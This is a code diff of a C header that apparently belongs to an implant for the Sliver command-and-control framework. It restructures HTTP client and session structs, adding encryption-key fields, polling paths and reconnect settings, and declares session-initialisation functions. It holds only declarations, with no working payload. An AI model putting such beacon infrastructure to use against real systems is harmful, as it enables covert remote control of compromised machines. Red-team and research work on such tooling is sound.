@@ -97,70 +97,8 @@ typedef enum _HttpHeader
 	HeaderEnumEnd
 } HttpHeader;
 
-typedef enum _StatusCode {
-	Continue = 100,
-	SwitchingProtocols = 101,
-	OK = 200,
-	Created = 201,
-	Accepted = 202,
-	NonAuthInfo = 203,
-	NoContent = 204,
-	ResetContent = 205,
-	PartialContent = 206,
-	MultiStatus = 207,
-	AlreadyReported = 208,
-	IMUsed = 226,
-	MultipleChoices = 300,
-	MovedPermanently = 301,
-	Found = 302,
-	SeeOther = 303,
-	NotModified = 304,
-	UseProxy = 305,
-	TemporaryRedirect = 307,
-	PermanentRedirect = 308,
-	BadRequest = 400,
-	Unauthorized = 401,
-	PaymentRequired = 402,
-	Forbidden = 403,
-	NotFound = 404,
-	MethodNotAllowed = 405,
-	NotAcceptable = 406,
-	ProxyAuthRequired = 407,
-	RequestTimeout = 408,
-	Conflict = 409,
-	Gone = 410,
-	LengthRequired = 411,
-	PreconditionFailed = 412,
-	RequestEntityTooLarge = 413,
-	RequestUriTooLarge = 414,
-	UnsupportedMediaType = 415,
-	RangeNotSatisfiable = 416,
-	ExpectationFailed = 417,
-	MisdirectedRequest = 421,
-	UnprocessableEntity = 422,
-	Locked = 423,
-	FailedDependency = 424,
-	UpgradeRequired = 426,
-	PreconditionRequired = 428,
-	TooManyRequests = 429,
-	RequestHeaderFieldsTooLarge = 431,
-	UnavailableForLegalReasons = 451,
-	InternalError = 500,
-	NotImplemented = 501,
-	BadGateway = 502,
-	ServiceUnavailable = 503,
-	GatewayTimeout = 504,
-	HttpVersionNotSupported = 505,
-	VariantAlsoNegotiates = 506,
-	InsufficientStorage = 507,
-	LoopDetected = 508,
-	NotExtended = 510,
-	NetworkAuthenticationRequired = 511,
-} StatusCode;
-
 typedef struct _HTTP_REQUEST {
 	HttpMethod Method;
-	LPSTR ContentTy;
 	LPSTR lpData;
 	DWORD cbData;
 	DWORD dwResolveTimeout;
@@ -189,24 +127,41 @@ typedef struct _HTTP_CONFIG {
 	LPSTR AdditionalHeaders[HeaderEnumEnd];
 } HTTP_CONFIG, *PHTTP_CONFIG;
 
+typedef struct _HTTP_CLIENT {
+	PURI pUri;
+	PHTTP_SESSION pHttpSession;
+	HINTERNET hConnection;
+} HTTP_CLIENT, * PHTTP_CLIENT;
+
 typedef struct _SLIVER_HTTP_CLIENT {
 	HTTP_CONFIG HttpConfig;
 	PHTTP_CLIENT pHttpClient;
 	CHAR szSessionID[33];
+	CHAR szSliverName[32];
 	PBYTE pSessionKey;
+	LPSTR lpRecipientPubKey;
+	LPSTR lpPeerPubKey;
+	LPSTR lpPeerPrivKey;
 	DWORD cbSessionKey;
 	LPSTR lpHostName;
 	DWORD dwPort;
 	BOOL UseStandardPort;
 	LPSTR PollPaths[66];
+	DWORD cbPollPaths;
 	LPSTR PollFiles[109];
+	DWORD cbPollFiles;
 	LPSTR SessionPaths[99];
+	DWORD cbSessionPaths;
 	LPSTR SessionFiles[100];
+	DWORD cbSessionFiles;
 	LPSTR ClosePaths[57];
+	DWORD cbClosePaths;
 	LPSTR CloseFiles[103];
+	DWORD cbCloseFiles;
 	LPSTR lpPathPrefix;
 	DWORD dwMinNumOfSegments;
 	DWORD dwMaxNumOfSegments;
+	UINT64 uReconnectInterval;
 	UINT64 uEncoderNonce;
 	DWORD dwNetTimeout;
 	DWORD dwTlsTimeout;
@@ -220,12 +175,6 @@ typedef enum {
 	SessionType,
 	CloseType
 } SegmentType;
-
-typedef struct _HTTP_CLIENT {
-	PURI pUri;
-	PHTTP_SESSION pHttpSession;
-	HINTERNET hConnection;
-} HTTP_CLIENT, *PHTTP_CLIENT;
 
 typedef struct _HTTP_RESP {
 	PBYTE pRespData;
@@ -256,9 +205,7 @@ HINTERNET SendRequest
 (
 	_In_ PHTTP_CLIENT This,
 	_In_ PHTTP_REQUEST pRequest,
-	_In_ DWORD dwNumberOfAttemps,
-	_In_opt_ LPSTR lpData,
-	_In_opt_ DWORD cbData
+	_In_ DWORD dwNumberOfAttemps
 );
 
 DWORD ReadStatusCode
@@ -295,9 +242,9 @@ LPSTR GetContentTypeString
 
 PHTTP_RESP SendHttpRequest
 (
-	_In_ PHTTP_CONFIG This,
+	_In_ PHTTP_CONFIG pHttpConfig,
+	_In_ PHTTP_CLIENT pHttpClient,
 	_In_ HttpMethod Method,
-	_In_ LPSTR lpUrl,
 	_In_ LPSTR lpContentType,
 	_In_ LPSTR lpData,
 	_In_ DWORD cbData,
@@ -347,7 +294,18 @@ PHTTP_REQUEST CreateHttpRequest
 (
 	_In_ PHTTP_CONFIG pHttpConfig,
 	_In_ HttpMethod Method,
-	_In_ LPSTR lpContentType,
 	_In_ LPSTR lpData,
 	_In_ DWORD cbData
+);
+
+PSLIVER_HTTP_CLIENT SliverSessionInit();
+
+VOID FreeSliverHttpClient
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient
+);
+
+LPSTR StartSessionURL
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient
 );
